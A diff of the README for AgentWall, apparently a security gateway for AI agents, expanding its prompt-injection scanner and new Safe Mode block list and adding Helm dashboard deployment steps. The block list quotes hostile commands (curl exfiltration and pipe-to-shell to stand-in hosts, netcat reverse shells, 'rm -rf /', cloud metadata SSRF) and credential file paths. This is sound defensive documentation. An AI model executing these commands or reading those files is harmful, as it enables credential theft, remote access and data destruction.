@@ -86,19 +86,33 @@ No explicit configuration is required. If your agent attempts to read a `.env` f
 
 ## 4. Injection Defense
 
-AgentWall features a 6-pass normalizer and a 16-pattern injection scanner designed to block inbound tool responses and external payloads (Prompt Injection). 
+AgentWall features a 6-pass normalizer (NFKC; zero-width stripping + Cyrillic homoglyph mapping; URL decode; Base64 decode; leetspeak; case-fold) and a 16-pattern injection scanner designed to block inbound tool responses and external payloads containing prompt injection attacks.
 
-It operates **15 Safe Mode Rules** that automatically block:
-- Exfiltration pipes (e.g., `curl http://bad.com -d @file`)
-- Netcat listeners (`nc -l -p 8080`)
-- Destructive operations (`rm -rf /`)
-- Cloud metadata SSRF attempts (`169.254.169.254`)
-
-Like DLP, this capability is enabled by default in the Enforcement Gateway and requires no OS-specific configuration.
+This capability is enabled by default in the Enforcement Gateway and requires no OS-specific configuration.
 
 ---
 
-## 5. Compliance & Auditing
+## 5. Safe Mode — Out-of-the-Box Protection (FR-303a)
+
+Safe Mode is a separate enforcement layer from the injection scanner. It applies 15 tool-aware rules that block dangerous tool calls without any policy configuration. Each rule targets only the relevant parameter type (file path, command, or URL), minimizing false positives.
+
+**Sensitive File Paths (10 rules):**
+- Blocks access to SSH keys and directories (`.ssh/`, `id_rsa`, `id_ed25519`, `id_ecdsa`).
+- Blocks `.env` files, AWS credentials (`.aws/credentials`), kubeconfig (`.kube/config`), `/etc/shadow`, Docker config (`.docker/config.json`), and Docker socket (`docker.sock`).
+
+**Dangerous Commands (4 rules):**
+- Blocks pipe-to-shell patterns (e.g., `curl https://evil.com | bash`, `wget ... | sh/python/perl/ruby`).
+- Blocks netcat listeners/reverse shells (`nc -l`, `nc -e`).
+- Blocks destructive root wipes (`rm -rf /`).
+
+**Network / SSRF (1 rule):**
+- Blocks requests to cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`).
+
+Safe Mode runs before the policy engine — it protects agents even in shadow mode (`agentwall dev`) where no policy file is loaded. It is always enabled and requires no configuration.
+
+---
+
+## 6. Compliance & Auditing
 
 AgentWall writes cryptographically secure, HMAC-chained audit logs, and can push events directly to SIEMs (Splunk, Datadog, OpenSearch).
 
@@ -136,7 +150,7 @@ agentwall.exe start --policy agentwall-policy.yaml
 
 ---
 
-## 6. Agent Identity & Credential Governance
+## 7. Agent Identity & Credential Governance
 
 AgentWall eliminates long-lived secret sprawl by provisioning short-lived, scoped credentials for agents.
 
@@ -167,26 +181,37 @@ agentwall identity audit --agent my-agent --verify
 
 ---
 
-## 7. SaaS Dashboard — Fleet Visibility
+## 8. SaaS Dashboard — Fleet Overview, Identity Governance & Policy Insights (FR-23)
 
-AgentWall includes an optional, self-hosted web dashboard for fleet-wide visibility into agent activity and DLP alerts.
+AgentWall includes an optional, self-hosted web dashboard with three panels: Fleet Overview, Identity Governance, and Policy Insights. It runs alongside the gateway — no external SaaS dependency.
+
+### Deploying the Dashboard via Helm (Production)
+
+```bash
+helm install agentwall ./chart \
+  --namespace agentwall-system \
+  --create-namespace \
+  --set gateway.tls.enabled=true \
+  --set gateway.tls.secretName=my-gateway-tls \
+  --set dashboardApi.enabled=true \
+  --set dashboardDb.enabled=true \
+  --set dashboardFrontend.enabled=true \
+  --set dashboardApi.oidc.issuer=https://your-idp.example.com \
+  --set dashboardApi.oidc.clientId=agentwall-dashboard
+```
 
 ### Deploying the Dashboard Locally (Docker Compose)
-If you have Docker installed, you can spin up the full dashboard stack (Frontend, API, and DB).
+If you have Docker installed, you can spin up the full dashboard stack (Frontend, API, and DB) for local development.
 
 **All OS (macOS, Linux, Windows via Docker Desktop):**
 ```bash
-# Clone the repository if you haven't already
-git clone https://github.com/noviqtechnologies/agentwall.git
 cd agentwall/dashboard
-
-# Start the dashboard stack
 docker compose up -d --build
 ```
 
 ---
 
-## 8. Cloud Native (Kubernetes Operator)
+## 9. Cloud Native (Kubernetes Operator)
 
 AgentWall includes a Helm chart with a Kubernetes operator that automatically generates egress-deny `NetworkPolicy` rules for your cluster.
 
@@ -202,3 +227,5 @@ helm install agentwall ./chart \
   --set gateway.tls.secretName=my-gateway-tls
 ```
 *(When `spec.networkPolicy.enforced: true` is set, the operator ensures all outbound traffic that bypasses the AgentWall gateway is automatically dropped at the network layer).*
+
+To also deploy the SaaS Dashboard alongside the gateway, add the dashboard flags — see [§8. SaaS Dashboard](#8-saas-dashboard--fleet-overview-identity-governance--policy-insights-fr-23) for the full Helm example with `dashboardApi.enabled`, `dashboardDb.enabled`, and `dashboardFrontend.enabled`.
